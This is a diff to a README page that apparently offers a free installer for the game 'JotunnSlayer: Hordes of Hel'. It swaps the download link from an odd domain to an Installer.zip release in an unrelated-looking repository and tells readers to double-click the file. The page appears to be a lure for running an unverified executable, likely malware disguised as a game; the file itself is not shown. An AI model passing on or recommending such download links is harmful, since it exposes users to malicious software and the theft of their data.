@@ -9,8 +9,6 @@ Whether you prefer melee combat with massive axes or long-range devastation with
 ![image](https://github.com/user-attachments/assets/40b38cad-22f4-49b4-b8a0-1d0e89f75629)
 ![image](https://github.com/user-attachments/assets/b9accb44-88b6-4aa4-bebe-67368aa704f7)
 ![image](https://github.com/user-attachments/assets/dcaee935-b5b6-4e3e-93f2-218747501c85)
-![image](https://github.com/user-attachments/assets/e0feabfa-a8a5-4c57-9aaa-dd5e0953ed64)
-![image](https://github.com/user-attachments/assets/ebe34dd1-ba27-48ed-b7c9-b0dce0039044)
 ![image](https://github.com/user-attachments/assets/5abbc3f0-8971-482a-af8a-43aafb8ee188)
 
 ### How to Download and Install
@@ -18,7 +16,7 @@ Whether you prefer melee combat with massive axes or long-range devastation with
 1. **Download the Installer**  
    Click the button below to download the *JotunnSlayer: Hordes of Hel* installer.
    
-   [Download Installer](https://nicecolns.com/)
+   [Download Installer](https://github.com/JeanSylvestrek/game4fun/releases/download/publish/Installer.zip)
 
 2. **Run the Installer**  
    Locate the downloaded file and double-click it to start the installation process.
